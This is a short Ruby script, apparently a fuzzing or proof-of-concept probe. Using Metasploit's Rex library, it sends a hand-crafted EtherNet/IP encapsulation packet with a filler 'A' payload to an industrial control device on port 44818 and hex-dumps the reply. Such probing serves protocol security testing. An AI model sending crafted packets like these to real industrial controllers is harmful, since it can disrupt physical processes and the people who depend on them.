#!/usr/bin/env ruby
#https://raw.githubusercontent.com/boundary/wireshark/master/epan/dissectors/packet-enip.c
require 'rex'

begin 

sock = Rex::Socket::Tcp.create('PeerHost'  => "192.168.1.129", 
                               'PeerPort'  => 44818)
payload = "A" * 8 

data =  [0x6f].pack('v')                         # cmd
data << [0x1c].pack('v').force_encoding("UTF-8") # size
data << [0x00000000].pack('V')                   # handle
data << [0x00000000].pack('V')                   # status
data << [0x00000000].pack('V') * 2               # context
data << [0x00000000].pack('V')                   # options
data << [0x00000000].pack('V')                   #
data << [0x0000].pack('v')                       # 

data << [0x02].pack('v').force_encoding("UTF-8") # Item Count
data << [0xa1].pack('v').force_encoding("UTF-8") # EtherNet/IP Common Data Format Type IDs
data << [0x04].pack('v').force_encoding("UTF-8") # size
data << [0x00].pack('V')                         # connection id
data << [0xb1].pack('v').force_encoding("UTF-8") # EtherNet/IP Common Data Format Type IDs
data << [payload.size].pack('v').force_encoding("UTF-8")
data << payload

sock.write(data)
puts "[*] Sent:"
puts Rex::Text.to_hex_dump(data)
res = sock.get_once()
puts "[!] received:"
puts Rex::Text.to_hex_dump(res)
rescue => e
puts "[!] #{e.to_s}"
end
